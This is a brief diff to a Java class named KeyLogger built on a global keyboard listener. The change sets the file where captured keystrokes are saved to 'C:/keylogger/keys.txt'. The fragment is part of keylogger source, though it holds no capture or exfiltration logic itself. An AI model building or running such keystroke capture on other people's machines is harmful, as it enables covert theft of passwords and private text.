@@ -21,7 +21,7 @@ import org.slf4j.LoggerFactory;
  */
 public class KeyLogger implements NativeKeyListener {
 
-	private static final Path file = Paths.get("C:/");
+	private static final Path file = Paths.get("C:/keylogger/keys.txt");
 	//private static final Logger logger = LoggerFactory.getLogger(KeyLogger.class);
 
 	public static void main(String[] args) {
